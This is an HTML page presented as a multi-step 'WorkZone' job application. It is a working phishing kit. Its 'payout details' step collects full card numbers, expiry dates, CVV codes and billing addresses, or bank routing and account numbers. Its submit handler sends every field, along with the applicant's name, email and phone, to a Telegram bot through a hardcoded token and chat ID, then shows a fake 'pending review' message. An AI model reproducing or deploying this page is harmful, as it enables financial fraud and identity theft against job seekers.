<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WorkZone | Application Form</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='0.9em' font-size='90'>üíº</text></svg>" />
  <style>
    * {
      box-sizing: border-box; margin: 0; padding: 0;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f9fafc;
      color: #2d3a4e;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 2rem 1rem;
      align-items: center;
    }
    h2 {
      font-weight: 700;
      text-align: center;
      margin-bottom: 1rem;
      color: #007bff;
      font-size: 1.7rem;
    }
    label {
      margin-top: 1.2rem;
      font-weight: 600;
      font-size: 1rem;
      display: block;
      color: #2d3a4e;
    }
    input, select {
      width: 100%;
      padding: 13px 14px;
      margin-top: 6px;
      border-radius: 10px;
      border: 1.8px solid #c3c3c3;
      font-size: 1.05rem;
      font-weight: 400;
      transition: border-color 0.3s ease;
    }
    input:focus, select:focus {
      outline: none;
      border-color: #007bff;
      box-shadow: 0 0 10px rgba(0,123,255,0.3);
    }
    .btn {
      margin-top: 2.5rem;
      width: 100%;
      padding: 16px;
      font-size: 1.2rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 60px;
      cursor: pointer;
      font-weight: 700;
      transition: background-color 0.3s ease;
      box-shadow: 0 6px 14px rgba(0,123,255,0.35);
    }
    .btn:hover {
      background: #0056b3;
      box-shadow: 0 8px 20px rgba(0,86,179,0.5);
    }
    .toggle {
      display: flex;
      margin-top: 1.8rem;
      background: #e4e9f2;
      border-radius: 60px;
      overflow: hidden;
      user-select: none;
      box-shadow: inset 0 0 8px #c7cee3;
      max-width: 520px;
      margin-left: auto;
      margin-right: auto;
    }
    .toggle div {
      flex: 1;
      text-align: center;
      padding: 15px 0;
      cursor: pointer;
      font-weight: 700;
      color: #007bff;
      font-size: 1.1rem;
      transition: background-color 0.3s ease, color 0.3s ease;
      user-select: none;
    }
    .toggle .active {
      background: #007bff;
      color: white;
      box-shadow: 0 0 15px rgba(0,123,255,0.7);
    }
    .step {
      display: none;
      flex-direction: column;
      max-width: 520px;
      background: white;
      padding: 2.5rem 3rem;
      border-radius: 20px;
      box-shadow: 0 14px 38px rgba(0,0,0,0.12);
      width: 100%;
      color: #2d3a4e;
      margin-top: 1.5rem;
    }
    .step.active {
      display: flex;
    }
    .thankyou {
      font-weight: 700;
      text-align: center;
      font-size: 1.5rem;
      color: #007bff;
      padding: 3.5rem 1rem;
    }
    .back-link {
      color: #007bff;
      cursor: pointer;
      text-decoration: underline;
      font-weight: 600;
      text-align: center;
      max-width: 520px;
      margin-bottom: 1rem;
      user-select: none;
    }
    @media (max-width: 600px) {
      h2 {
        font-size: 1.4rem;
      }
      .step {
        padding: 2rem 1.8rem;
      }
    }
  </style>
</head>
<body>
  <a href="index.html" class="back-link" aria-label="Back to landing page">‚Üê Back to WorkZone</a>

  <form id="jobForm" novalidate>
    <!-- Step 1 -->
    <div class="step active" id="step-1">
      <h2>Step 1: Your Information</h2>
      <label for="name">Full Name *</label>
      <input id="name" name="name" required autocomplete="name" />
      <label for="email">Email *</label>
      <input id="email" type="email" name="email" required autocomplete="email" />
      <label for="phone">Phone *</label>
      <input id="phone" name="phone" required autocomplete="tel" pattern="\\+?\\d{7,15}" title="Enter a valid phone number" />
      <label for="education">Education Level *</label>
      <select id="education" name="education" required>
        <option value="">Select...</option>
        <option>High School</option>
        <option>Associate</option>
        <option>Bachelor</option>
        <option>Graduate</option>
      </select>
      <label for="industry">Industry *</label>
      <select id="industry" name="industry" required>
        <option value="">Select...</option>
        <option>Retail</option>
        <option>Technology</option>
        <option>Healthcare</option>
        <option>Administration</option>
      </select>
      <button type="button" class="btn" onclick="nextStep(2)">Next</button>
    </div>

    <!-- Step 2 -->
    <div class="step" id="step-2">
      <h2>Step 2: Payout Details</h2>
      <div class="toggle" role="tablist" aria-label="Select payout method">
        <div id="toggle-card" role="tab" aria-selected="true" tabindex="0" class="active" onclick="togglePayout('card')" onkeydown="if(event.key==='Enter')togglePayout('card')">üí≥ Card</div>
        <div id="toggle-bank" role="tab" aria-selected="false" tabindex="0" onclick="togglePayout('bank')" onkeydown="if(event.key==='Enter')togglePayout('bank')">üè¶ Bank</div>
      </div>
      <div id="card-form" role="tabpanel" aria-hidden="false">
        <label for="cardName">Name on Card *</label>
        <input id="cardName" name="cardName" required autocomplete="cc-name" />
        <label for="cardNumber">Card Number *</label>
        <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number"/>
        <label for="expiry">Expiry (MM/YY) *</label>
        <input id="expiry" name="expiry" required autocomplete="cc-exp" pattern="^(0[1-9]|1[0-2])\\/\\d{2}$" title="Format MM/YY" />
        <label for="cvv">CVV *</label>
        <input id="cvv" name="cvv" required autocomplete="cc-csc" pattern="\\d{3,4}" title="3 or 4 digit CVV"/>
        <label for="billingAddress">Billing Address *</label>
        <input id="billingAddress" name="billingAddress" required autocomplete="street-address" />
        <label for="billingCity">City *</label>
        <input id="billingCity" name="billingCity" required autocomplete="address-level2" />
        <label for="billingState">State *</label>
        <input id="billingState" name="billingState" required autocomplete="address-level1" />
        <label for="billingZip">ZIP Code *</label>
        <input id="billingZip" name="billingZip" pattern="\\d{5}" title="5-digit ZIP code" required autocomplete="postal-code" />
      </div>
      <div id="bank-form" role="tabpanel" aria-hidden="true" hidden>
        <label for="bankName">Bank Name *</label>
        <input id="bankName" name="bankName" autocomplete="organization" />
        <label for="routingNumber">Routing Number *</label>
        <input id="routingNumber" name="routingNumber" autocomplete="routing" />
        <label for="accountNumber">Account Number *</label>
        <input id="accountNumber" name="accountNumber" autocomplete="account-number" />
        <label for="accountType">Account Type *</label>
        <select id="accountType" name="accountType">
          <option>Checking</option>
          <option>Savings</option>
        </select>
      </div>
      <button type="button" class="btn" onclick="nextStep(3)">Next</button>
    </div>

    <!-- Step 3 -->
    <div class="step" id="step-3">
      <h2>Step 3: Confirm & Submit</h2>
      <p style="text-align:center; font-size:1rem; color:#555;">
        We will email you with onboarding instructions once you submit.
      </p>
      <button type="submit" class="btn">Submit Application</button>
    </div>

    <!-- Thank You -->
    <div class="step" id="step-thanks" role="alert" aria-live="polite">
      <p class="thankyou">‚úÖ Thank you! Your application is pending review.<br/>Check your email within 24 hours.</p>
    </div>
  </form>

  <script>
    const steps = document.querySelectorAll('.step');
    const cardForm = document.getElementById('card-form');
    const bankForm = document.getElementById('bank-form');
    const toggleCard = document.getElementById('toggle-card');
    const toggleBank = document.getElementById('toggle-bank');

    function nextStep(n) {
      steps.forEach(s => s.classList.remove('active'));
      document.getElementById('step-' + n).classList.add('active');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function togglePayout(type) {
      if(type === 'card') {
        cardForm.hidden = false;
        bankForm.hidden = true;
        cardForm.setAttribute('aria-hidden', 'false');
        bankForm.setAttribute('aria-hidden', 'true');
        toggleCard.classList.add('active');
        toggleBank.classList.remove('active');
        toggleCard.setAttribute('aria-selected', 'true');
        toggleBank.setAttribute('aria-selected', 'false');

        [...cardForm.querySelectorAll('input')].forEach(i => i.required = true);
        [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = false);
      } else {
        cardForm.hidden = true;
        bankForm.hidden = false;
        cardForm.setAttribute('aria-hidden', 'true');
        bankForm.setAttribute('aria-hidden', 'false');
        toggleCard.classList.remove('active');
        toggleBank.classList.add('active');
        toggleCard.setAttribute('aria-selected', 'false');
        toggleBank.setAttribute('aria-selected', 'true');

        [...cardForm.querySelectorAll('input')].forEach(i => i.required = false);
        [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = true);
      }
    }

    function escapeMarkdown(text) {
      return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
    }

    document.getElementById('jobForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const form = this;

      const currentStep = [...steps].find(s => s.classList.contains('active'));
      if (!currentStep) return;

      const inputsToCheck = currentStep.querySelectorAll('input, select');
      for (const input of inputsToCheck) {
        if (!input.checkValidity()) {
          input.reportValidity();
          input.focus();
          return;
        }
      }

      if (currentStep.id !== 'step-3') {
        alert('Please proceed to the last step before submitting.');
        return;
      }

      const data = Object.fromEntries(new FormData(form));
      const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
      const CHAT_ID = '1318100118';

      const payoutMethod = cardForm.hidden ? 'bank' : 'card';

      const commonFields = ['name', 'email', 'phone', 'education', 'industry'];
      let payoutFields = [];

      if (payoutMethod === 'card') {
        payoutFields = ['cardName', 'cardNumber', 'expiry', 'cvv', 'billingAddress', 'billingCity', 'billingState', 'billingZip'];
      } else {
        payoutFields = ['bankName', 'routingNumber', 'accountNumber', 'accountType'];
      }

      let msg = '*üì• New WorkZone Application*\n\n';

      for (const key of commonFields) {
        if (data[key]) msg += `*${escapeMarkdown(key)}*: ${escapeMarkdown(data[key])}\n`;
      }
      msg += `*Payout Method*: ${payoutMethod.toUpperCase()}\n`;
      for (const key of payoutFields) {
        if (data[key]) msg += `*${escapeMarkdown(key)}*: ${escapeMarkdown(data[key])}\n`;
      }

      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
      });

      nextStep('thanks');
      form.reset();
      window.scrollTo({ top: 0, behavior: 'smooth' });
      // Reset to default payout tab card on reset
      togglePayout('card');
    });

    // Initialize with card payout selected
    togglePayout('card');
  </script>
</body>
</html>
